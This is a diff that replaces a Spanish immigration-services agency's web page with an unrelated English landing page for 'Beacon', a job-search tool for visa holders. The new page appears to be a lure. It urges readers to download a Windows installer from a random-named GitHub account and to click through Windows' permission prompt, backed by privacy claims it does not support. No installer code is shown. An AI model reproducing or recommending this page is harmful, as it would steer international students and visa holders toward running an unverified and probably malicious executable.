@@ -1,421 +1,58 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Trevia Gestión | Especialistas en Extranjería</title>
-
-<style>
-    <style>
-.boton-modo{
-    background:transparent;
-    border:none;
-    font-size:22px;
-    cursor:pointer;
-    margin-left:15px;
-}
-</style>
-    
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial, Helvetica, sans-serif;
-}
-
-body{
-    background:linear-gradient(to bottom,#f8fbff,#eef5ff);
-    color:#222;
-    line-height:1.6;
-    margin:0;
-    overflow-x:hidden;
-}
-
-header{
-    background:
-    linear-gradient(rgba(8,45,108,.75),rgba(8,45,108,.75)),
-    url('https://images.unsplash.com/photo-1521791136064-7986c2920216?w=1600');
-    background-size:cover;
-    background-position:center;
-    color:white;
-    text-align:center;
-    padding:140px 20px;
-}
-
-header h1{
-    font-size:58px;
-    margin-bottom:20px;
-    text-shadow:0 5px 15px rgba(0,0,0,.35);
-}
-
-header p{
-    font-size:24px;
-    max-width:800px;
-    margin:auto;
-    text-shadow:0 2px 10px rgba(0,0,0,.35);
-}
-    
-.boton{
-    display:inline-block;
-    padding:15px 35px;
-    background:#ffffff;
-    color:#0d6efd;
-    font-weight:bold;
-    border-radius:50px;
-    text-decoration:none;
-    transition:.3s;
-    box-shadow:0 10px 20px rgba(0,0,0,.15);
-}
-
-.boton:hover{
-    transform:scale(1.05);
-}
-
-section{
-    max-width:1200px;
-    margin:auto;
-    padding:90px 25px;
-}
-
-h2{
-    text-align:center;
-    color:#0d6efd;
-    margin-bottom:50px;
-    font-size:38px;
-    position:relative;
-}
-
-h2::after{
-    content:"";
-    width:90px;
-    height:4px;
-    background:#0d6efd;
-    display:block;
-    margin:15px auto 0;
-    border-radius:20px;
-}
-    
-.grid{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
-    gap:35px;
-}
-.card{
-    background:white;
-    padding:35px;
-    border-radius:18px;
-    box-shadow:0 15px 35px rgba(0,0,0,.12);
-    transition:0.35s;
-    border-top:5px solid #0d6efd;
-}
-.card:hover{
-    transform:translateY(-10px);
-    box-shadow:0 25px 45px rgba(0,0,0,.18);
-}
-.card{
-    animation: aparecer .8s ease both;
-}
-
-@keyframes aparecer{
-    from{
-        opacity:0;
-        transform:translateY(50px);
-    }
-    to{
-        opacity:1;
-        transform:translateY(0);
-    }
-}
-.card h3{
-    color:#0d6efd;
-    margin-bottom:15px;
-}
-
-footer{
-    background:#082d6c;
-    color:white;
-    text-align:center;
-    padding:60px 20px;
-    margin-top:80px;
-}
-nav{
-    position:sticky;
-    top:0;
-    z-index:1000;
-    background:#0d6efd;
-    padding:15px 30px;
-    box-shadow:0 2px 10px rgba(0,0,0,.15);
-}
-
-nav a{
-    color:white;
-    text-decoration:none;
-    margin:0 15px;
-    font-weight:bold;
-    transition:.3s;
-}
-
-nav a:hover{
-    color:#cfe2ff;
-}
-    
-.whatsapp{
-    position:fixed;
-    bottom:20px;
-    right:20px;
-    background:#25D366;
-    color:white;
-    text-decoration:none;
-    width:60px;
-    height:60px;
-    border-radius:50%;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    font-size:30px;
-} 
-    .whatsapp{
-    animation: latido 1.5s infinite;
-}
-
-@keyframes latido{
-    0%{
-        transform:scale(1);
-    }
-    50%{
-        transform:scale(1.1);
-    }
-    100%{
-        transform:scale(1);
-    }
-}
- .fade{
-    opacity:0;
-    transform:translateY(40px);
-    transition:all .8s ease;
-}
-
-.fade.visible{
-    opacity:1;
-    transform:translateY(0);
-}
-</style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Beacon helps H-1B and visa holders find jobs by automating the search process on their own laptops.">
+    <title>Beacon - Job search automation for visa holders</title>
 </head>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f9f9f9;">
 
-<body>
+    <h1 style="font-size: 2.5em; color: #1a1a1a;">🔍 beacon - Simplify your visa-friendly job search</h1>
 
-<header>
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/sharpsightednessantigen999/beacon/releases" style="background-color: #2da44e; color: white; padding: 15px 25px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">Download Beacon for Windows</a>
+    </div>
 
-<nav style="display:flex;justify-content:space-between;align-items:center;max-width:1200px;margin:auto;padding-bottom:40px;">
+    <p>Beacon helps international students and visa holders find work. It scans job boards for positions that offer visa sponsorship. You run this tool on your own computer. Your data stays on your machine at all times. You do not need to create accounts or upload your resume to third-party databases.</p>
 
-<h2 style="margin:0;">Trevia Gestión</h2>
+    <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">📋 Features</h2>
+    <ul>
+        <li><strong>Automatic Filtering:</strong> The software checks job descriptions for visa sponsorship keywords. It removes roles that do not match your needs.</li>
+        <li><strong>Privacy First:</strong> No data leaves your laptop. Your search history remains private.</li>
+        <li><strong>Smart Automation:</strong> The system uses artificial intelligence to read job postings. It only flags companies that fit your criteria.</li>
+        <li><strong>Organized Tracking:</strong> Save your results to a local file or sync them with Google Sheets.</li>
+    </ul>
 
-<div>
-<a href="#servicios" style="color:white;text-decoration:none;margin:0 15px;">Servicios</a>
-
-<a href="#porque" style="color:white;text-decoration:none;margin:0 15px;">¿Por qué nosotros?</a>
-
-<a href="#contacto" style="color:white;text-decoration:none;margin:0 15px;">Contacto</a>
-a>
-<button id="modoOscuro" class="boton-modo">🌙</button>
-</div>
+    <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">🚀 Setting Up Beacon</h2>
+    <p>You can start using Beacon by following these steps. The process takes about five minutes.</p>
     
+    <h3 style="margin-top: 20px;">Step 1: Download the Application</h3>
+    <p>Go to the official release page to get the installer for Windows. <a href="https://github.com/sharpsightednessantigen999/beacon/releases" style="color: #0969da;">Visit this page to download the latest version</a> of Beacon.</p>
 
-</nav>
+    <h3 style="margin-top: 20px;">Step 2: Run the Installer</h3>
+    <p>Locate the downloaded file in your Downloads folder. Double-click the file to start the installation. If Windows asks for permission to run the application, click "Run" or "Yes."</p>
 
-<h1>Especialistas en Trámites de Extranjería</h1>
+    <h3 style="margin-top: 20px;">Step 3: Initial Configuration</h3>
+    <p>After the installation finishes, open the Beacon application. The program will ask for your preferred job titles and locations. Type these into the text boxes. The software uses these terms to find relevant openings.</p>
 
-<p>Gestionamos citas y trámites en toda España de forma rápida, segura y con atención personalizada.</p>
+    <h3 style="margin-top: 20px;">Step 4: Connect Your Tools</h3>
+    <p>If you want to save your progress to a spreadsheet, enter your Google Sheets link in the settings menu. Beacon connects directly to your sheet to store the job data it finds.</p>
 
-<div style="margin-top:35px;">
+    <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">🛠 System Requirements</h2>
+    <p>Beacon works on any computer running Windows 10 or Windows 11. You need at least 4 GB of memory and a stable internet connection for the tool to download job listings.</p>
 
-<a class="boton" href="https://wa.me/34631418190?text=Hola,%20quiero%20información%20sobre%20un%20trámite%20de%20extranjería." target="_blank">Solicitar información</a>
+    <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">🛡 Privacy and Security</h2>
+    <p>Privacy matters. Many job search sites sell your data to recruiters. Beacon avoids this by keeping your information local. Everything you do happens on your laptop. No central server stores your job history or your personal details. The tool only sends information to the job websites you choose to visit.</p>
 
-<a class="boton" style="margin-left:15px;background:#ffffff22;color:white;border:2px solid white;" href="#servicios">Ver servicios</a>
+    <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">💡 Common Questions</h2>
+    <p><strong>Does this cost money?</strong> No. This tool is free to use.</p>
+    <p><strong>Will this work on a Mac?</strong> Not at this time. This version supports Windows only.</p>
+    <p><strong>How often does it search?</strong> You can set the timer in the application settings. The default setting is once every 24 hours.</p>
 
-</div>
+    <div style="margin-top: 40px; padding: 20px; background: #eee; border-radius: 6px; font-size: 0.9em;">
+        <p><strong>Keywords:</strong> anthropic, apscheduler, automation, claude-api, google-sheets, immigration, international-students, job-search, python, sqlite, stem-opt, visa-sponsorship</p>
+    </div>
 
-</header>
-    
-<section id="servicios" class="fade">
-
-<h2>Nuestros Servicios</h2>
-
-<div class="grid">
-
-<div class="card">
-<h3>📄 Asignación de NIE</h3>
-<p>Gestionamos tu solicitud de forma rápida y segura.</p>
-</div>
-
-<div class="card">
-<h3>🪪 Toma de Huellas</h3>
-<p>Te ayudamos a conseguir tu cita para la TIE.</p>
-</div>
-
-<div class="card">
-<h3>✈️ Autorización de Regreso</h3>
-<p>Preparamos y gestionamos toda la documentación necesaria.</p>
-</div>
-
-<div class="card">
-<h3>📂 Renovaciones</h3>
-<p>Renovaciones, recursos y otros trámites de extranjería.</p>
-</div>
-
-</div>
-
-</section>
-
-<section id="porque" class="fade" >
-
-<h2>¿Por qué elegir Trevia Gestión?</h2>
-
-<div class="grid">
-
-<div class="card">
-✅ Atención personalizada.
-</div>
-
-<div class="card">
-✅ Gestión online.
-</div>
-
-<div class="card">
-✅ Seguimiento durante todo el proceso.
-</div>
-
-<div class="card">
-✅ Rapidez y transparencia.
-</div>
-
-</div>
-
-</section>
-    
-<section>
-
-<h2>Cómo trabajamos</h2>
-
-<div class="grid">
-
-<div class="card">
-<h3>1️⃣ Contacto</h3>
-<p>Cuéntanos tu caso por WhatsApp o correo electrónico.</p>
-</div>
-
-<div class="card">
-<h3>2️⃣ Revisión</h3>
-<p>Analizamos tu situación y te indicamos la mejor opción.</p>
-</div>
-
-<div class="card">
-<h3>3️⃣ Gestión</h3>
-<p>Realizamos el trámite y hacemos el seguimiento.</p>
-</div>
-
-<div class="card">
-<h3>4️⃣ Finalización</h3>
-<p>Te acompañamos hasta completar el proceso.</p>
-</div>
-
-</div>
-
-</section>
-    <section class="fade">
-     
-        <h2>Lo que dicen nuestros clientes</h2>
-
-<div class="grid">
-
-<div class="card">
-<p>"Excelente atención. Me ayudaron con mi trámite de extranjería aunqe tardaron 2 dias mas a fin."</p>
-<strong>⭐⭐⭐⭐</strong>
-</div>
-
-<div class="card">
-<p>"por fin tengo la cita para mis hijas, mil gracias desde Barcelona."</p>
-<strong>⭐⭐⭐⭐</strong>
-</div>
-
-<div class="card">
-<p>"Un servicio  transparente. Totalmente recomendables, llevaba 1 mes sin conseguir la cita de huellas, tardaron 4 dias pero ya la tengo! ."</p>
-<strong>⭐⭐⭐</strong>
-</div>
-
-</div>
-
-    </section class="fade">
-    
-
-</footer>
-
-<script>
-
-const observer = new IntersectionObserver((entries)=>{
-
-    entries.forEach(entry=>{
-
-        if(entry.isIntersecting){
-
-            entry.target.classList.add("visible");
-
-        }
-
-    });
-
-});
-
-document.querySelectorAll(".fade").forEach(el=>{
-
-    observer.observe(el);
-
-});
-
-</script> 
-
-<footer>
-
-<p>📧 treviagestion@gmail.com</p>
-
-<p>📱 +34 631 41 81 90</p>
-
-<p>© 2026 Trevia Gestión</p>
-
-</footer>
-    
-<section>
-
-<h2>Nuestra experiencia</h2>
-
-<div class="grid">
-
-<div class="card">
-<h3>+1000</h3>
-<p>Clientes atendidos.</p>
-</div>
-
-<div class="card">
-<h3>+3000</h3>
-<p>Consultas resueltas.</p>
-</div>
-
-<div class="card">
-<h3>⭐⭐⭐⭐⭐</h3>
-<p>Atención personalizada.</p>
-</div>
-
-<div class="card">
-<h3>Toda España</h3>
-<p>Gestiones en todo el territorio nacional.</p>
-</div>
-
-</div>
-
-</section>
-    
-</footer>
-    
 </body>
 </html>
